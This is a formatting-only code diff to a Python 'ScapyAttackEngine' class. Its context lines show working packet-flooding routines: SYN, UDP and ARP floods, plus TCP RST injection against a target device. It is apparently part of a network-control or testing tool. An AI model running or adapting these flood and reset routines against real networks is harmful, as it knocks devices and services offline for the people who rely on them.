@@ -770,12 +770,15 @@ class ScapyAttackEngine(AttackEngine):
                 return
 
             import random
+
             end_time = time.time() + duration
             common_ports = [80, 443, 8080, 22, 23, 3389]  # Common service ports
 
             while time.time() < end_time:
                 if not self._running_attacks.get(target_mac):
-                    logger.info(f"[ScapyEngine] SYN Flood attack on {target_mac} aborted")
+                    logger.info(
+                        f"[ScapyEngine] SYN Flood attack on {target_mac} aborted"
+                    )
                     break
 
                 # Send SYN packets to multiple ports with random source ports
@@ -785,7 +788,7 @@ class ScapyAttackEngine(AttackEngine):
                         sport=sport,
                         dport=dport,
                         flags="S",  # SYN flag
-                        seq=random.randint(1000, 100000)
+                        seq=random.randint(1000, 100000),
                     )
 
                     try:
@@ -816,19 +819,24 @@ class ScapyAttackEngine(AttackEngine):
                 return
 
             import random
+
             end_time = time.time() + duration
             common_udp_ports = [53, 123, 161, 1900]  # DNS, NTP, SNMP, SSDP
 
             while time.time() < end_time:
                 if not self._running_attacks.get(target_mac):
-                    logger.info(f"[ScapyEngine] UDP Flood attack on {target_mac} aborted")
+                    logger.info(
+                        f"[ScapyEngine] UDP Flood attack on {target_mac} aborted"
+                    )
                     break
 
                 # Send UDP packets with random payload
                 for dport in common_udp_ports:
                     sport = random.randint(1024, 65535)
                     payload = bytes([random.randint(0, 255) for _ in range(512)])
-                    udp_packet = IP(dst=target_ip) / UDP(sport=sport, dport=dport) / payload
+                    udp_packet = (
+                        IP(dst=target_ip) / UDP(sport=sport, dport=dport) / payload
+                    )
 
                     try:
                         await asyncio.wait_for(
@@ -869,14 +877,11 @@ class ScapyAttackEngine(AttackEngine):
                             # Craft RST packet
                             if packet[TCP].flags & 0x02:  # SYN flag
                                 # Respond to SYN with RST
-                                rst = (
-                                    IP(src=packet[IP].dst, dst=packet[IP].src)
-                                    / TCP(
-                                        sport=packet[TCP].dport,
-                                        dport=packet[TCP].sport,
-                                        flags="R",  # RST flag
-                                        seq=packet[TCP].ack,
-                                    )
+                                rst = IP(src=packet[IP].dst, dst=packet[IP].src) / TCP(
+                                    sport=packet[TCP].dport,
+                                    dport=packet[TCP].sport,
+                                    flags="R",  # RST flag
+                                    seq=packet[TCP].ack,
                                 )
                                 send(rst, verbose=False)
                         except Exception as e:
@@ -921,7 +926,9 @@ class ScapyAttackEngine(AttackEngine):
 
             while time.time() < end_time:
                 if not self._running_attacks.get(target_mac):
-                    logger.info(f"[ScapyEngine] ARP Flood attack on {target_mac} aborted")
+                    logger.info(
+                        f"[ScapyEngine] ARP Flood attack on {target_mac} aborted"
+                    )
                     break
 
                 # Generate random IP addresses
@@ -938,7 +945,9 @@ class ScapyAttackEngine(AttackEngine):
 
                 try:
                     await asyncio.wait_for(
-                        asyncio.to_thread(sendp, arp_request, iface=iface, verbose=False),
+                        asyncio.to_thread(
+                            sendp, arp_request, iface=iface, verbose=False
+                        ),
                         timeout=0.1,
                     )
                 except Exception as e:
@@ -952,21 +961,21 @@ class ScapyAttackEngine(AttackEngine):
 
     async def _resolve_mac_to_ip(self, mac: str) -> str | None:
         """Resolve MAC address to IP address from state manager or ARP table.
-        
+
         Args:
             mac: Target MAC address
-            
+
         Returns:
             IP address string or None if not found
         """
         try:
             from app.services.state import get_state_manager
-            
+
             state = get_state_manager()
             device = state.get_device(mac)
             if device and device.ip:
                 return str(device.ip)
-            
+
             # Fallback: scan ARP table (platform-specific)
             # For now, return None if not in state
             logger.warning(f"[ScapyEngine] Could not resolve IP for {mac}")
